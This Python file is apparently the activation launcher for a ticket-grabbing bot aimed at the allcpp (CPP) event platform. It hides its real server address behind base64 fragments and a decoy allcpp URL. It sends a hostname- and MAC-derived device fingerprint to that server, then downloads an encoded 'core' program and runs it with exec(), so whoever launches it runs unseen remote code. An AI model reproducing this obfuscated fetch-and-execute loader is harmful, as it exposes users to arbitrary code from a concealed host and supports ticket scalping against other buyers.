import os
import sys
import requests
import hashlib
import uuid
import platform
import base64


def get_api_activate():
    fake = "cp.allcpp.cn/activate.php"
    try:
        part_a = base64.b64decode("aHR0cA==").decode()
        part_b = "://"
        part_c = base64.b64decode("MTA2MDkwLnh5eg==").decode()
        part_d = "/activate.php"
        real_url = part_a + part_b + part_c + part_d
        return real_url
    except:
        return fake


def get_api_core():
    return get_api_activate().replace("activate", "get_core")


def get_device_id():
    info = f"{platform.node()}{uuid.getnode()}"
    return hashlib.md5(info.encode()).hexdigest()[:16]


DEVICE_ID = get_device_id()


def print_info(msg):
    print(f"[INFO] {msg}")


def print_success(msg):
    print(f"[SUCCESS] {msg}")


def print_error(msg):
    print(f"[ERROR] {msg}")


def activate(key, action='verify'):
    """
    action: 'verify' (常规验证) 或 'trial' (申请临时)
    """
    try:
        data = {"key": key, "device_id": DEVICE_ID, "action": action}
        r = requests.post(get_api_activate(), data=data, timeout=10)
        return r.text.strip()
    except Exception:
        return "error"


if __name__ == "__main__":
    print("===== CPP 抢票程序 - 安全增强版 =====")
    print(f"设备 ID: {DEVICE_ID}")

    KEY = ""
    KEY_FILE = ".active_key"

    # 【新增】标记用户是否曾经激活过（用于判断是否允许试用）
    was_previous_user = False

    # 1. 尝试读取本地密钥
    if os.path.exists(KEY_FILE):
        was_previous_user = True  # 文件存在，说明是老用户
        with open(KEY_FILE, "r", encoding="utf-8") as f:
            KEY = f.read().strip()

    # 2. 如果有密钥，先验证有效性
    if KEY:
        print_info("正在验证本地激活码...")
        res = activate(KEY, action='verify')

        if res == "success":
            print_success("验证通过，正在加载...")
        elif res == "expired":
            print_error("激活码已过期（体验结束或授权到期）。")
            KEY = ""
            # 过期后删除文件，强制重新激活流程
            if os.path.exists(KEY_FILE):
                os.remove(KEY_FILE)
        elif res == "used":
            print_error("该激活码已被其他设备绑定。")
            KEY = ""
            if os.path.exists(KEY_FILE):
                os.remove(KEY_FILE)
        else:
            print_error(f"验证失败: {res}")
            KEY = ""
            if os.path.exists(KEY_FILE):
                os.remove(KEY_FILE)

    # 3. 如果没有有效密钥，进入激活流程
    if not KEY:
        print("\n===== 需要激活 =====")

        # 【核心逻辑修改】
        # 如果是老用户（之前有过激活记录，但现在过期或无效），直接跳过试用选项
        if was_previous_user:
            print_info("检测到您曾使用过激活码。体验结束后，请输入正式激活码继续使用。")
            # 强制设为 'n'，不询问
            choice = 'n'
        else:
            # 全新用户，询问是否试用
            choice = input("是否申请 24 小时免费体验？(y/n): ").strip().lower()

        if choice == 'y':
            print_info("正在向服务器申请临时授权...")
            # 发送 trial 请求
            res = activate("", action='trial')

            if res.startswith("success|"):
                parts = res.split("|")
                if len(parts) == 2:
                    new_key = parts[1]
                    print_success(f"申请成功！临时激活码: {new_key}")
                    KEY = new_key
                    with open(KEY_FILE, "w", encoding="utf-8") as f:
                        f.write(KEY)
                    print_info("已保存至本地，即将启动程序。")
                else:
                    print_error("服务器返回数据格式错误。")
                    sys.exit(1)
            elif res == "device_already_activated":
                print_error("该设备已注册过，无法再次申请体验。")
                print_info("将转为手动输入正式激活码...")
            else:
                print_error(f"申请失败: 该设备已注册过，无法再次申请体验")
                print_info("将转为手动输入正式激活码...")

        # 如果没选体验，或者体验申请失败，要求输入正式码
        if not KEY:
            while True:
                key = input("请输入正式激活码: ").strip()
                if not key:
                    print_error("激活码不能为空。")
                    continue

                res = activate(key, action='verify')
                if res == "success":
                    print_success("激活成功！")
                    KEY = key
                    with open(KEY_FILE, "w", encoding="utf-8") as f:
                        f.write(key)
                    break
                elif res == "used":
                    print_error("该激活码已被其他设备绑定")
                elif res == "invalid":
                    print_error("激活码无效")
                elif res == "expired":
                    print_error("激活码已过期")
                elif res == "device_already_activated":
                    print_error("系统错误：设备状态异常，请联系管理员。")
                else:
                    print_error(f"激活失败: {res}")

    # 4. 获取核心代码
    print_info("正在连接服务器获取核心程序...")

    try:
        # 再次确保发送的是最终确定的 KEY
        r = requests.post(get_api_core(), data={"key": KEY, "device_id": DEVICE_ID}, timeout=15)

        if r.status_code != 200:
            print_error(f"服务器拒绝连接 (状态码: {r.status_code})")
            sys.exit(1)

        response_text = r.text.strip()

        if response_text.startswith("error"):
            if "expired" in response_text:
                print_error("远程验证失败：授权已过期。请删除 .active_key 后重试。")
                if os.path.exists(KEY_FILE):
                    os.remove(KEY_FILE)
            else:
                print_error(f"服务器返回错误: {response_text}")
            sys.exit(1)

        try:
            core_code = base64.b64decode(response_text).decode('utf-8')
        except Exception:
            core_code = response_text

        exec(core_code)

    except KeyboardInterrupt:
        print_info("\n用户中断运行")
        sys.exit(0)
    except Exception as e:
        print_error(f"程序发生严重错误: {e}")
        sys.exit(1)